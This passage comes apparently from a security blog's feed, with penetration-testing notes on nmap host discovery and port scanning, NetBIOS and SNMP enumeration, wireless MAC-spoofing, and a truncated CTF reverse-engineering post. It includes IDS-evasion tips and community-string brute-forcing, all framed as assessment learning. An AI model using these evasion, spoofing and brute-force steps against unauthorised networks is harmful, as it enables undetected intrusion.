TCP Dump output is presented here. As both the IP address are in the same subnet, nmap would use ARP Ping scan to find the alive IP Address.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>22:11:27.292054 ARP, Request who-has 10.0.0.230 (Broadcast) tell 10.0.0.1, length 28
</span><span class='line'>22:11:27.361100 ARP, Reply 10.0.0.230 is-at 8c:64:22:3b:2b:2d (oui Unknown), length 28</span></code></pre></td></tr></table></div></figure>

However, this behavior can be changed using --disable-arp-ping
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sn 10.0.0.230 --disable-arp-ping</span></code></pre></td></tr></table></div></figure>
TCPdump output is as below: One ICMP Echo Request, SYN to Port 443, ACK to Port 80 and a time stamp request.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>22:14:02.742180 IP 10.0.0.1 &gt; 10.0.0.230: ICMP echo request, id 45066, seq 0, length 8
</span><span class='line'>22:14:02.742222 IP 10.0.0.1.59246 &gt; 10.0.0.230.https: Flags [S], seq 3994420539, win 1024, options [mss 1460], length 0
</span><span class='line'>22:14:02.742234 IP 10.0.0.1.59246 &gt; 10.0.0.230.http: Flags [.], ack 3994420539, win 1024, length 0
</span><span class='line'>22:14:02.742241 IP 10.0.0.1 &gt; 10.0.0.230: ICMP time stamp query id 38635 seq 0, length 20
</span><span class='line'>22:14:02.801243 IP 10.0.0.230 &gt; 10.0.0.1: ICMP echo reply, id 45066, seq 0, length 8
</span><span class='line'>22:14:02.801930 IP 10.0.0.230.https &gt; 10.0.0.1.59246: Flags [R.], seq 0, ack 3994420540, win 0, length 0
</span><span class='line'>22:14:02.805083 IP 10.0.0.230.http &gt; 10.0.0.1.59246: Flags [R], seq 3994420539, win 0, length 0
</span><span class='line'>22:14:02.805930 IP 10.0.0.230 &gt; 10.0.0.1: ICMP time stamp reply id 38635 seq 0: org 00:00:00.000, recv 16:40:52.731, xmit 16:40:52.731, length 20</span></code></pre></td></tr></table></div></figure>

If you use --reason option, nmap would tell why it thinks the host is alive. In the below case (received echo-reply).
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Nmap scan report for 10.0.0.230
</span><span class='line'>Host is up, received echo-reply (0.073s latency).</span></code></pre></td></tr></table></div></figure>
If we only want to send ICMP Ping query ( as if the host replies to it, the other three packets (SYN 443, ACK 80 and Timestamp ) are extra burden. ( I may be wrong here)
We can use
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -n -sn -PE --disable-arp-ping 10.0.0.230 </span></code></pre></td></tr></table></div></figure>
TCP Dump output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>22:30:20.768525 IP 10.0.0.1 &gt; 10.0.0.230: ICMP echo request, id 39366, seq 0, length 8
</span><span class='line'>22:30:20.826098 IP 10.0.0.230 &gt; 10.0.0.1: ICMP echo reply, id 39366, seq 0, length 8</span></code></pre></td></tr></table></div></figure>

Please note, this ICMP scan would miss all the host which are alive but the firewall is dropping the ICMP echo request packet. However, if you want to find more hosts, it would be advisable to separate the list of IPs which responded to ICMP from the IP address scan range and run the scan again may be with SYN to 443 and ACK to 80 using PA, PS options.
<br><br>
Please also note Nmap's ICMP ping, by default, sends zero data as part of the ping. Nmap typically pings the host via icmp if the user has root privileges, and uses a tcp-ping otherwise. This is easily detected by the Snort IDS Rule 1-469 <a href="https://www.snort.org/rule_docs/1-469">SID 1-469</a>.
<br><br>
This could be evaded by using 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>--data &lt;hex string&gt; (Append custom binary data to sent packets)
</span><span class='line'>--data-string &lt;string&gt; (Append custom string to sent packets)
</span><span class='line'>--data-length &lt;number&gt; (Append random data to sent packets)</span></code></pre></td></tr></table></div></figure>
Please note that you should use this options only on ICMP Echo Request for IDS Evasion as the data gets appended to every packet (ex. port scan packets).
<br>
<br>
Designing the ideal combinations of probes as suggested in the Nmap Book is 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-PE -PA -PS 21,22,23,25,80,113,31339 -PA 80,113,443,10042
</span><span class='line'>Adding --source-port 53 might also help</span></code></pre></td></tr></table></div></figure>
The above combination would find more hosts than just the ping scan, however it also gonna cost a decent amount of time. Normal Time vs Accuracy trade off.
</li>

<li><strong>Port Scanning:</strong><br>
Once you have the list of IP Addresses which are alive, we can do port scan on them. Nmap provides multiple options such as
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-sS TCP SYN Stealth : Half Open SYN Scan : Nmap sends the SYN packet, Server would send SYN/ACK, System would send RST.
</span><span class='line'>-sT TCP Connect Scan : Nmap uses system to send the SYN scan : Connect full TCP Handshake
</span><span class='line'>-sU UDP Scan 
</span><span class='line'>-sA ACK Scan : Ack scan is generally used to map out firewall rulesets. Whether firewall is stateful or not.</span></code></pre></td></tr></table></div></figure> 

Please note p0f recognizes Nmap's SYN scan because of the TCP Options such as TCP window size a multiple of 1024, and only the MSS option supported with a value of 1460 (Check the tcpdump output of Ping scan above, SYN Packet). Recently, a IRC user was getting filtered port while using SYN Scan whereas was getting OPN ports which using telnet or TCP Connect Scan.

Also, A patch to allow a user to override the TCP Window size in SYN scan was just posted to the <a href="http://seclists.org/nmap-dev/2015/q3/52">Nmap Development List</a>.

<br><br>
By default, nmap scans the 1000 most popular ports of each protocol ( gathered by scanning million of IP address). Scanning 1000 ports in an unknown environment with 16 million IP Address could be challenging. Nmap also provides -F Fast scan option which scans the 100 most common ports in each protocol. Otherwise it also provides --top-ports to specify an arbitrary number of ports.
<br><br>
So, How do we know what are the ports scanned with --top-ports option. This could be found by
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sT -oG - -v | grep '^# Ports'</span></code></pre></td></tr></table></div></figure>
or
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap localhost -F -oX - | grep '^&lt;scaninfo'</span></code></pre></td></tr></table></div></figure>
Nmap needs an nmap-services file with frequency information in order to know which ports are the most common. See the section called <a href="http://seclists.org/nmap-dev/2015/q3/52">Well Known Port List: nmap-services</a> : for more information about port frequencies.
<br>
We could provide ports to nmap by using -p option also, for example
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-p 22 : Scan single port
</span><span class='line'>-p 22,25,80 : Scan multiple ports with comma separated values. If -sS is specified TCP ports would be scanned. If -sU UDP Scan is specified, UDP Ports would be scanned.
</span><span class='line'>-p80-85, 443, 8000-8005 : Scan port with ranges.
</span><span class='line'>-p- : Scan all the ports excluding 0.
</span><span class='line'>-pT:21,22,25,U:53,111,161 : Scan TCP 21,22,25 and UDP Ports 53,111,161. -sU must also be specified.
</span><span class='line'>-p http* : wild cards may be used for ports with similar names. This would match nine ports including 80,280,443,591,593,8000,8008,8080,8443.</span></code></pre></td></tr></table></div></figure>

Port scanning via <strong>netcat</strong>: Netcat might not be the best tool to use for port scanning, but can be used quickly. netcat scans TCP ports by default, but we can perform UDP scans as well.
<br>
<br>
For a TCP scan, the format is 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vvn -z xxx.xxx.xxx.xxx startport-endport
</span><span class='line'>
</span><span class='line'>-z flag is Zero-I/O mode ( used for scannng )
</span><span class='line'>-vv will provide verbose information about the results
</span><span class='line'>-n flag allows to skip the DNS lookup</span></code></pre></td></tr></table></div></figure>

For a UDP Port Scan, we need to add -u flag which makes the format
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vvn -u -z xxx.xxx.xxx.xxx startport-endport</span></code></pre></td></tr></table></div></figure>

<strong>Identifying service versions:</strong>
<br>
Ideally, we can use -sV to probe the ports to find the version running. When performing a version scan (-sV), Nmap sends a series of probes, each of which is assigned a rarity value between one and nine.  The higher the number, the more likely it is the service will be correctly identified. However, high intensity scans take longer. The intensity must be between 0 and 9. The default is 7.
<br><br>
Ideally, to avoid the IDS Detection, we should avoid using -sV option. However, we can keep the noise less by using --version intensity by which we can control the number of probes sent to determine the service. Setting this option to 0 will send only the Null probe (connect and wait for banner) and any probes that have been specifically listed as pertaining to the scanned port in nmap-service-probes. The other options available are below:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>--version-light (Enable light mode) : Alias for --version-intensity 2.
</span><span class='line'>--version-all (Try every single probe) : An alias for --version-intensity 9
</span><span class='line'>--version-trace (Trace version scan activity) : Print debugging information.</span></code></pre></td></tr></table></div></figure>

Also, when -sV is specified apart from the probes, all the scripts in the <a href="https://nmap.org/nsedoc/categories/version.html">Version</a> category are executed. These scripts could be prevented from running by removing them from the script.db catalog or by building Nmap without NSE support (./configure --without-liblua). However, if --version-intensity option is less than 7, those scripts won't be executed ( I might be a little wrong here).
<br>
So our scan would become approx
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap &lt;IP_Address_Range&gt; -n --top-ports &lt;number&gt;/-p &lt;Custom Port List&gt; -sV --version-intensity 0/ (No -sV)</span></code></pre></td></tr></table></div></figure>

<strong>Performance:</strong>
So, How can we improve the performance of our nmap scan, so that result could be achieved faster. However, as always we will have Time Vs Accuracy Trade off.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-T&lt;0-5&gt;: Set timing template (higher is faster)
</span><span class='line'>--min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;time&gt;: Specifies probe round trip time.
</span><span class='line'>--max-retries &lt;tries&gt;: Caps number of port scan probe retransmissions.
</span><span class='line'>--host-timeout &lt;time&gt;: Give up on target after this long
</span><span class='line'>--scan-delay/--max-scan-delay &lt;time&gt;: Adjust delay between probes
</span><span class='line'>--min-rate &lt;number&gt;: Send packets no slower than &lt;number&gt; per second
</span><span class='line'>--max-rate &lt;number&gt;: Send packets no faster than &lt;number&gt; per second</span></code></pre></td></tr></table></div></figure>

T0,T1,T2 is specifically for IDS Evasion. T3 is the default.<br>

We can set max-retries to a lower value such as 2. Currently it's 10 for T0,T1,T2,T3; 6 for T4 and 2 for T5.
<br><br>
<strong>Nmap Scripts:</strong>
<br>
As bonsaiviking says <a href="http://blog.bonsaiviking.com/2015/07/they-see-me-scannin-part-2.html">Here</a>:<br>
If you are wild enough to try NSE scripts against an IDS-protected target, you should know how to read Lua, since the script sources are the final authority on what data is sent. But if you're just looking to get a little better at blending in, these tips should help:
<ul>
<li>Use --script-args-file to pass script arguments to Nmap from a file. This will keep your command line clean and make it harder to accidentally miss one of the options you choose</li>
<li>Obviously avoid dos, intrusive, and exploit category scripts.</li>
<li>Use scripts by name instead of by category, so that you know exactly what will be run.</li>
<li>Thoroughly read the documentation for each script you intend to use.</li>
<li>Set http.useragent to something believable that blends in. Currently, The HTTP scripts all use a User-Agent header that identifies as "Nmap Scripting Engine."</li>
</ul>
<br>
<strong>Output Options:</strong>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-oN/-oX/-oS/-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3, and Grepable format, respectively, to the given filename.
</span><span class='line'>-oA &lt;basename&gt;: Output in the three major formats at once
</span><span class='line'>--reason: Display the reason a port is in a particular state
</span><span class='line'>--open: Only show open (or possibly open) ports
</span><span class='line'>--packet-trace: Show all packets sent and received
</span><span class='line'>--resume &lt;filename&gt;: Resume an aborted scan : Filename should be .nmap or .gnmap</span></code></pre></td></tr></table></div></figure>

At this point, it's good to find what are the most common ports open in the scan we just performed by
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>grep "^[0-9]\+" &lt;nmap file .nmap extension&gt; | grep "\ open\ " | sort | uniq -c | sort -rn | awk '{print "\""$1"\",\""$2"\",\""$3"\",\""$4"\",\""$5" "$6" "$7" "$8" "$9" "$10" "$11" "$12" "$13"\""}' &gt; test.csv</span></code></pre></td></tr></table></div></figure>
</li>
<li><strong>Exploring the Network Further:</strong><br>
By now, we would have information about what ports are open and possibly what services are running on them. Further, we need to explore the various options by which we can get more information.<br>
<ul>
<br>
<strong>Gathering Screenshots for http* services:</strong><br>

There are four ways (in my knowledge to do this)
<li><strong>http-screenshot NSE</strong>:<br> Nmap has a NSE script <a href="https://github.com/SpiderLabs/Nmap-Tools/blob/master/NSE/http-screenshot.nse">http-screenshot</a> This could be executed while running nmap. It uses wkhtml2image tool in the script. Sometimes, you may find that running this script takes a long time. It might be a good idea to gather all the http* running IP, Port and provide this information to wkhtml2image directly via scripting. You do have to install wkhtml2image and test with disable javascript and other options available.</li>
<li><strong>httpscreenshot</strong> from breenmachine: <a href="https://github.com/breenmachine/httpscreenshot">httpscreenshot</a>  is a tool for grabbing screenshots and HTML of large numbers of websites. The goal is for it to be both thorough and fast which can sometimes oppose each other.</li>
<li><strong>Eyewitness</strong> from Chris Truncer: <a href="https://github.com/ChrisTruncer/EyeWitness">EyeWitness</a>  is designed to take screenshots of websites, provide some server header info, and identify default credentials if possible.</li>
<li>Another method is to use <a href="https://code.google.com/p/java-html2image/">html2image</a> which is a simple Java library converts plain HTML markup to image and provides client-side image-map using HTML <map> element.</li>

<br>
<strong>Information gathering for http* services:</strong><br>
<br>
<li><strong>RAWR: Rapid Assesment of Web Resourses</strong>:<br> <a href="https://bitbucket.org/al14s/rawr/wiki/Home">RAWR</a> provides with a customizable CSV containing ordered information gathered for each host, with a field for making notes/etc.; An elegant, searchable, JQuery-driven HTML report that shows screenshots, diagrams, and other information. A report on relevent security headers. In short, it provides a landscape of your webapplications. It takes input from multiple formats such as Nmap, Nessus, OpenVAS etc.</li>
<li> <a href="http://www.morningstarsecurity.com/research/whatweb"><strong>WhatWeb</strong></a> recognises web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded device.  <a href="https://www.aldeid.com/wiki/Tellmeweb">Tellmeweb</a> is a ruby script to read Nmap Gnmap file and run whatweb on all of them. A <a href="https://github.com/stevecoward/whatweb-parser">WhatWeb Result Parser</a>  also has been written  which converts the results to CSV format. More information about advance usage can be found <a href="https://github.com/urbanadventurer/WhatWeb/wiki/Advanced-Usage">here</a>.</li>
<li><a href="http://wappalyzer.com"><strong>Wapplyzer</strong></a> is a Firefox plug-in. It works only on regular expression matching and doesn't need anything other than the page to be loaded on browser. It works completely at the browser level and gives results in the form of icons.</li>
<li><a href="http://w3techs.com/"><strong>W3Tech</strong></a> is another Chrome plug-in which provides information about the usage of various types of technologies on the web. It tells the web technologies based on the crawling it has done. So example.com, x1.example.com, x2.example.com will show the same technologies as the domain is same (which is not correct).</li>
<li><a href="https://github.com/justjavac/ChromeSnifferPlus"><strong>ChromeSnifferPlus</strong></a> is another chrome extension to sniff about the different web-technologies used by the website.</li>
<li><a href="http://builtwith.com/"><strong>BuiltWith</strong></a> is another website which provides a good amount of information about the different technologies used by website.</li>
</ul>
</li>
<li><strong>NetBIOS Service:</strong> 
<br>
Netbios listens on TCP Port 139, 445 and UDP Port 137.
<br><br>
How do we machines on which these three ports or a combination are open and feed that IP information to nbtscan and enum4linux.
We can do this by using grep such as
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>grep -E "^Host.*[ ]137/open/udp" &lt;Nmap .gnmap file&gt;     : Grep 137 UDP Ports to run nbtscan
</span><span class='line'>grep -E "^Host.*[ ]139/open/tcp" &lt;Nmap .gnmap file&gt;     
</span><span class='line'>#If we want that tcp port 139 and 445 both must be open
</span><span class='line'>grep -E "^Host.*[ ]139/open/tcp" &lt;Nmap .gnmap file&gt; | grep -E "^Host.*[ ]445/open/tcp" &lt;Nmap .gnmap file&gt; : Grep TCP 135 and 445 port to run enum4linux
</span><span class='line'>#If we want that tcp port 139 or 445 must be open
</span><span class='line'>grep -E "^Host.*[ ]139/open/tcp|[ ]443/open/tcp" &lt;Nmap .gnmap file&gt;</span></code></pre></td></tr></table></div></figure>
<ul>
<li><strong>NBTSCAN:</strong>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nbtscan
</span><span class='line'>-v        Verbose output. Print all names received from each host.
</span><span class='line'>-f filename     Take IP addresses to scan from file "filename"</span></code></pre></td></tr></table></div></figure></li>
<li><strong>enum4linux</strong>: A Linux alternative to enum.exe for enumerating data from Windows and Samba hosts. It is is basically a wrapper around the Samba tools smbclient, rpclient, net and nmblookup. A very good usage guide is <a href="https://labs.portcullis.co.uk/tools/enum4linux/">here</a>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>enum4linux -a 192.168.2.55  : enumerate all the information it can from a remote host</span></code></pre></td></tr></table></div></figure>
 </li>
</ul>
</li>
<li><strong>SNMP Enumeration:</strong>
<br>
For SNMP Enumeration, UDP Port 161 should be open.
If the port 161 is open we can use
<ul>
<li><strong>snmpcheck:</strong>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>snmpcheck -t &lt;IP address&gt;
</span><span class='line'>-c : SNMP community; default is public
</span><span class='line'>-v : SNMP version (1,2); default is 1
</span><span class='line'>-w : detect write access (separate action by enumeration)</span></code></pre></td></tr></table></div></figure></li>
<li>
<strong>snmpwalk:</strong>
<br>
It also allows us to interact with the SNMP version 3. It also allows to extract particular nodes of a MIB tree.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>snmpwalk -­c public ­‐v1 &lt;IP Address&gt;  : Enumerating  the  Entire  MIB  Tree
</span><span class='line'>snmpwalk -­c public ­‐v1 &lt;IP Address&gt;  &lt;MIB Tree Number&gt; : Enumerate particular node
</span><span class='line'>-v 1|2c|3     specifies SNMP version to use
</span><span class='line'>-c COMMUNITY      set the community string</span></code></pre></td></tr></table></div></figure>
</li>
<li><strong>OneSixtyOne:</strong>
<br>
onesixtyone allows you to brute force the community strings, you could onesixty one tool
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>onesixtyone [options] &lt;host&gt; &lt;community&gt;
</span><span class='line'>  -c &lt;communityfile&gt; file with community names to try
</span><span class='line'>  -i &lt;inputfile&gt;     file with target hosts
</span><span class='line'>  -o &lt;outputfile&gt;    output log</span></code></pre></td></tr></table></div></figure>
</li>
</ul> </li>
</ol>

</li>
</li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Learning From Field : Wireless Pentesting]]></title>
    <link href="http://bitvijays.github.io/blog/2015/03/11/learning-from-field-wireless-pentesting/"/>
    <updated>2015-03-11T15:28:34+05:30</updated>
    <id>http://bitvijays.github.io/blog/2015/03/11/learning-from-field-wireless-pentesting</id>
    <content type="html"><![CDATA[<p>Recently, We got a chance to do some penetration testing. This post would cover the basics and approach.</p>

<!-- more -->


<p></p>

<h3>Thanks to Girish Nemade</h3>

<p>Basic wireless network tests could be performed by using your wireless adapter installed in your laptop. However, few external USB cards are suggested by Offsec such as</p>

<ol type=i>
<li>Netgear WN111v2 USB</li>
<li>ALFA Networks AWUS036H USB 500mW</li>
</ol>


<p>which provide a better area coverage.</p>

<p><strong>Basics:</strong></p>

<ol>
<li>Set the wireless interface in the monitor mode.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>airmon-ng &lt;start|stop&gt; &lt;interface&gt; [channel] : Enable monitor mode on an interface (and specify a channel).
</span><span class='line'>airmon-ng &lt;check&gt; [kill]                     : List all possible programs that could interfere with the wireless card. If 'kill' is specified, it will try to kill all of them.</span></code></pre></td></tr></table></div></figure>
</li>
<li>Use airodump

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>airodump &lt;monitor interface&gt;
</span><span class='line'>-N, --essid                 : Filter APs by ESSID.                                  ##Name of the Access Point
</span><span class='line'>-d &lt;bssid&gt;, --bssid &lt;bssid&gt; : It will only show networks, matching the given bssid. ##MAC Address of Access Point
</span><span class='line'>-a                          : It will only show associated clients.
</span><span class='line'>-t &lt;OPN|WEP|WPA|WPA1|WPA2&gt;, --encrypt &lt;OPN|WEP|WPA|WPA1|WPA2&gt; : It will only show networks matching the given encryption.
</span><span class='line'>-R, --essid-regex              Filter APs by ESSID using a regular expression</span></code></pre></td></tr></table></div></figure>
</li>   
<li>OPEN
If there is no MAC authentication, and dhcp enabled, your machine would connect automatically. If there is no MAC authentication but dhcp is not enabled, it is advisable to sniff the network using wireshark and find the appropiate network range and the default gateway and set them manually. If there is MAC authentication and DHCP not enabled, you need to find valid associated clients. The catch is the valid associated clients will have an IP address whereas invalid associated clients will not have the IP address.
<br>
Find the associated clients connected to the particular access point by using the csv file produced by airodump. In the below example the access point is "24:DE:C6:C7:92:C2".
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat PL-01.csv | grep 24:DE:C6:C7:92:C2 | cut -d , -f 1,6 | grep -v OPN</span></code></pre></td></tr></table></div></figure>
You may change your ip address of wireless adapter using
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ifconfig wlan4 hw ether 30:5A:3A:B4:09:BC
</span><span class='line'>or 
</span><span class='line'>macchanger
</span><span class='line'>  -m,  --mac=XX:XX:XX:XX:XX:XX
</span><span class='line'>       --mac XX:XX:XX:XX:XX:XX  Set the MAC XX:XX:XX:XX:XX:XX</span></code></pre></td></tr></table></div></figure>
Once associated, we still need to find the valid IP address and valid MAC address, sniff the network, find the network ranges, gateway. Do a nmap Ping Scan to the local subnet which will provide IP address and MAC address. Cross-verify with the associated clients. Valid associated clients will have an IP address and MAC address entry in the airodump listing.
Set the IP address using
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ifconfig wlan4 10.10.3.71 netmask 255.255.240.0</span></code></pre></td></tr></table></div></figure>
Set the association using
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>iwconfig wlan4 essid "ESSID_NAME" ap "24:DE:C6:C7:92:C2(SSID_MAC_Address)"</span></code></pre></td></tr></table></div></figure></li>
</ol>


<p><strong>WEP</strong></p>

<p>Abbrev:</p>

<p><strong><strong><strong><strong>ENC</strong></strong></strong></strong>*
WEP: Wired Equivalent Privacy
WPA: Wi-Fi Protected Access
WPA: i-Fi Protected Access II</p>

<p><strong><strong><strong>**Cipher</strong></strong></strong>
TKIP: Temporal Key Integrity Protocol
CCMP: Counter Mode CBC-MAC Protocol</p>

<p><strong><strong><strong><em>AUTH</em></strong></strong></strong>**
PSK: Pre-Shared Key
MGT:
SKA: Shared Key Authentication</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Learning From CTF : Reverse Engineering]]></title>
    <link href="http://bitvijays.github.io/blog/2015/01/02/learning-from-ctf-reverse-engineering/"/>
    <updated>2015-01-02T08:45:59+05:30</updated>
    <id>http://bitvijays.github.io/blog/2015/01/02/learning-from-ctf-reverse-engineering</id>
    <content type="html"><![CDATA[<p>This post lists the learnings from the CTF while doing Reverse Engineering.</p>

<!-- more -->


<p>If we are provided with a binary to reverse engineer, for example asking for password.</p>

<ol>

<li>
file: The first step is to run file command on the binary which would tell us whether it is 32/64 bit or statically/dynamically linked etc.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bitvijays@kali:~/Desktop/CTF/31C3$ file cfy 
</span><span class='line'>cfy: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x9bc623f046535fba50a2124909fb871e5daf198e, not stripped</span></code></pre></td></tr></table></div></figure>
</li>
<li>
The second step could be running strings or "hexdump -C" on it, specially in the case of very simple re challenges like asking for password and stored in an array.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bitvijays@kali:~$ strings check 
</span><span class='line'>/lib/ld-linux.so.2
</span><span class='line'>D$,1
</span><span class='line'>D$%secrf
</span><span class='line'>D$)et
</span><span class='line'>D$ love
</span><span class='line'>T$,e3
</span><span class='line'>[^_]
</span><span class='line'>password: 
</span><span class='line'>/bin/sh
</span><span class='line'>Wrong password, Good Bye ...
</span><span class='line'>;*2$"</span></code></pre></td></tr></table></div></figure>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hexdump -C check | more 
</span><span class='line'>00000540  31 c0 c7 44 24 18 73 65  78 00 c7 44 24 25 73 65  |1..D$.sec..D$%se|
</span><span class='line'>00000550  63 72 66 c7 44 24 29 65  74 c6 44 24 2b 00 c7 44  |crf.D$)et.D$+..D|
</span><span class='line'>00000560  24 1c 67 6f 64 00 c7 44  24 20 6c 6f 76 65 c6 44  |$.god..D$ love.D|</span></code></pre></td></tr></table></div></figure>
</li>

<li>
The next step could be running strace or ltrace on the binary.

strace: trace system calls and signals
ltrace: A library call tracer
</li>

<li>GDB Commands:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
